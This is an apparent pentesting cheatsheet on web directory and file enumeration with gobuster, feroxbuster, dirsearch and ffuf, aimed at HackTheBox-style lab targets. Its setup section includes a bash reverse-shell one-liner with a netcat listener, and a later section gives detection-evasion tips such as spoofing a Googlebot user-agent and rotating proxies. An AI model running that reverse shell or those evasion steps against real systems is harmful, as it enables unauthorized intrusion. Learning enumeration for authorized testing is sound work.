+++
title = 'Web Directory Enumeration Cheatsheet'
date = '2024-01-01'
draft = false
description = 'Comprehensive guide for web directory and file enumeration using gobuster, feroxbuster, and other tools'
tags = ['web-enumeration', 'gobuster', 'feroxbuster', 'directory-brute-force', 'web-security']
categories = ['cheatsheets']
+++

# Web Directory Enumeration Cheatsheet

## Initial Setup and Preparation

### Environment Variables Setup
```bash
# Set up common environment variables for pentesting
export LPORT=10.10.14.13    # Your attacking machine IP
export RPORT=10.10.11.194   # Target machine IP
export LHOST=10.10.14.13    # Alternative naming
export RHOST=10.10.11.194   # Alternative naming

# Use in commands
nc -nlvp $LPORT
bash -i >& /dev/tcp/$LPORT/9001 0>&1
```

### Host File Modification
```bash
# Add target to hosts file for virtual host testing
sudo nano /etc/hosts

# Example entries
10.10.11.194   soccer.htb
10.10.11.194   soccer.htb soc-player.soccer.htb

# Alternative using echo
echo "10.10.11.194   soccer.htb" | sudo tee -a /etc/hosts
echo "10.10.11.194   soc-player.soccer.htb" | sudo tee -a /etc/hosts

# Verify hosts file entries
cat /etc/hosts | grep htb
```

### Target Information Gathering
```bash
# Ping test connectivity
ping -c 4 $RHOST
ping -c 4 soccer.htb

# Quick port check
nc -zv $RHOST 80
nc -zv $RHOST 443

# DNS resolution check
nslookup soccer.htb
dig soccer.htb
```

---

## Gobuster

### Basic Directory Enumeration
```bash
# Basic directory enumeration
gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt

# With specific extensions
gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php,html,txt

# Output to file
gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster

# Common comprehensive scan
gobuster dir -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster
```

### Advanced Gobuster Options
```bash
# Include status codes
gobuster dir -u http://target.com -w wordlist.txt -s "200,204,301,302,307,403"

# Set custom User-Agent
gobuster dir -u http://target.com -w wordlist.txt -a "Mozilla/5.0 (Custom Agent)"

# Add cookies
gobuster dir -u http://target.com -w wordlist.txt -c "sessionid=abc123"

# Add headers
gobuster dir -u http://target.com -w wordlist.txt -H "Authorization: Bearer token123"

# Proxy through Burp
gobuster dir -u http://target.com -w wordlist.txt -p http://127.0.0.1:8080

# Recursive enumeration
gobuster dir -u http://target.com -w wordlist.txt -r

# Follow redirects
gobuster dir -u http://target.com -w wordlist.txt -f
```

### Gobuster Modes
```bash
# Directory mode (default)
gobuster dir -u http://target.com -w wordlist.txt

# DNS subdomain enumeration
gobuster dns -d target.com -w subdomains.txt

# Virtual host enumeration
gobuster vhost -u http://target.com -w vhosts.txt

# S3 bucket enumeration
gobuster s3 -w bucket-names.txt
```

---

## Feroxbuster

### Basic Usage
```bash
# Basic directory scan
feroxbuster -u http://target.com

# With wordlist
feroxbuster -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt

# Medium directory scan
feroxbuster -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

### Advanced Feroxbuster Features
```bash
# Multiple extensions
feroxbuster -u http://target.com -x php,html,txt,js

# Specific depth
feroxbuster -u http://target.com --depth 4

# Rate limiting
feroxbuster -u http://target.com --rate-limit 10

# Custom threads
feroxbuster -u http://target.com -t 50

# Filter status codes
feroxbuster -u http://target.com -C 404,403

# Filter response size
feroxbuster -u http://target.com -S 1234

# Resume scan
feroxbuster --resume-from state.toml
```

### Feroxbuster Output Options
```bash
# JSON output
feroxbuster -u http://target.com -o results.json

# Silent mode
feroxbuster -u http://target.com --silent

# Extract links for further enumeration
feroxbuster -u http://target.com --extract-links

# Random delay between requests
feroxbuster -u http://target.com --random-agent
```

---

## Dirsearch

### Basic Commands
```bash
# Basic scan
dirsearch -u http://target.com

# With extensions
dirsearch -u http://target.com -e php,html,js

# Custom wordlist
dirsearch -u http://target.com -w custom-wordlist.txt

# Recursive scan
dirsearch -u http://target.com -r

# Save results
dirsearch -u http://target.com --format=simple -o results.txt
```

---

## Ffuf

### Directory Fuzzing
```bash
# Basic directory fuzzing
ffuf -w wordlist.txt -u http://target.com/FUZZ

# With extensions
ffuf -w wordlist.txt -u http://target.com/FUZZ -e .php,.html,.txt

# Filter by response code
ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301,302

# Filter by response size
ffuf -w wordlist.txt -u http://target.com/FUZZ -fs 1234

# Output to file
ffuf -w wordlist.txt -u http://target.com/FUZZ -o results.json -of json
```

### Parameter Fuzzing
```bash
# GET parameter fuzzing
ffuf -w wordlist.txt -u "http://target.com/search?FUZZ=test"

# POST data fuzzing
ffuf -w wordlist.txt -u http://target.com/login -X POST -d "username=admin&password=FUZZ"

# Header fuzzing
ffuf -w wordlist.txt -u http://target.com -H "X-Forwarded-For: FUZZ"
```

---

## Wordlists

### SecLists Common Paths
```bash
# Small wordlists (fast)
/opt/SecLists/Discovery/Web-Content/raft-small-words.txt
/opt/SecLists/Discovery/Web-Content/common.txt

# Medium wordlists (comprehensive)
/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt

# Large wordlists (extensive)
/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
/opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

# Technology-specific
/opt/SecLists/Discovery/Web-Content/spring-boot.txt
/opt/SecLists/Discovery/Web-Content/apache.txt
/opt/SecLists/Discovery/Web-Content/nginx.txt
```

### Custom Wordlist Creation
```bash
# Extract words from target website
cewl http://target.com -w custom-wordlist.txt

# Combine wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Generate variations
# Add common extensions to base words
sed 's/$/.php/' base-words.txt > php-files.txt
sed 's/$/.html/' base-words.txt > html-files.txt
```

---

## Targeted Enumeration

### Content Management Systems
```bash
# WordPress
gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/wordpress.fuzz.txt

# Drupal
gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/drupal.fuzz.txt

# Joomla
gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/joomla.fuzz.txt
```

### File Extensions by Technology
```bash
# PHP applications
gobuster dir -u http://target.com -w wordlist.txt -x php,php3,php4,php5,phtml

# ASP/ASP.NET applications
gobuster dir -u http://target.com -w wordlist.txt -x asp,aspx,asmx,ashx

# JSP applications
gobuster dir -u http://target.com -w wordlist.txt -x jsp,jspa,jspx

# Python applications
gobuster dir -u http://target.com -w wordlist.txt -x py,pyc,pyo

# Common web files
gobuster dir -u http://target.com -w wordlist.txt -x html,htm,js,css,xml,json
```

### Backup and Sensitive Files
```bash
# Common backup extensions
gobuster dir -u http://target.com -w wordlist.txt -x bak,backup,old,orig,tmp

# Configuration files
gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt

# Database files
gobuster dir -u http://target.com -w wordlist.txt -x sql,db,sqlite,mdb
```

---

## Stealth and Evasion

### Rate Limiting and Timing
```bash
# Slow scan to avoid detection
gobuster dir -u http://target.com -w wordlist.txt --delay 100ms

# Random User-Agent rotation
feroxbuster -u http://target.com --random-agent

# Custom User-Agent
gobuster dir -u http://target.com -w wordlist.txt -a "Mozilla/5.0 (Googlebot)"

# Proxy rotation
gobuster dir -u http://target.com -w wordlist.txt -p http://proxy1:8080
```

### Request Modification
```bash
# Add realistic headers
gobuster dir -u http://target.com -w wordlist.txt -H "Accept: text/html,application/xhtml+xml" -H "Accept-Language: en-US,en;q=0.9"

# Session-based enumeration
gobuster dir -u http://target.com -w wordlist.txt -c "PHPSESSID=abc123; auth_token=xyz789"

# Method tampering
ffuf -w wordlist.txt -u http://target.com/FUZZ -X POST
```

---

## Analysis and Follow-up

### Response Analysis
```bash
# Check for interesting status codes
grep -E "(200|301|302|403)" gobuster-results.txt

# Look for unusual response sizes
awk '{print $3, $1}' gobuster-results.txt | sort -n

# Extract found directories for further enumeration
grep "Status: 200" gobuster-results.txt | awk '{print $1}' > found-dirs.txt
```

### Automated Follow-up
```bash
# Recursive enumeration of found directories
while read dir; do
    gobuster dir -u http://target.com$dir -w wordlist.txt -x php,html
done < found-dirs.txt

# Screenshot found pages
while read url; do
    cutycapt --url=$url --out=screenshots/$(basename $url).png
done < found-urls.txt
```

---

## Common Findings and Next Steps

### Interesting Directories to Investigate
- `/admin/` - Administrative interfaces
- `/backup/` - Backup files and archives  
- `/config/` - Configuration files
- `/uploads/` - File upload functionality
- `/api/` - API endpoints
- `/docs/` - Documentation
- `/test/` - Test files and environments
- `/dev/` - Development resources

### File Types to Prioritize
- `.php`, `.asp`, `.jsp` - Server-side scripts
- `.config`, `.ini`, `.yaml` - Configuration files
- `.sql`, `.db` - Database files
- `.log` - Log files with potential sensitive data
- `.bak`, `.old` - Backup files
- `.git/`, `.svn/` - Version control directories

---

## Tips and Best Practices

### Performance Optimization
- Start with small wordlists for quick wins
- Use appropriate thread counts (10-50 for most servers)
- Implement delays for rate-limited or slow servers
- Use recursive scanning judiciously to avoid infinite loops

### Detection Avoidance
- Rotate User-Agents and request headers
- Implement random delays between requests
- Use proxy chains for sensitive targets
- Monitor for rate limiting or blocking responses

### Coverage Maximization
- Use multiple tools with different algorithms
- Combine wordlists for comprehensive coverage
- Include technology-specific extensions
- Follow up manual testing on interesting findings

---

*Always ensure you have proper authorization before conducting directory enumeration on any target system.*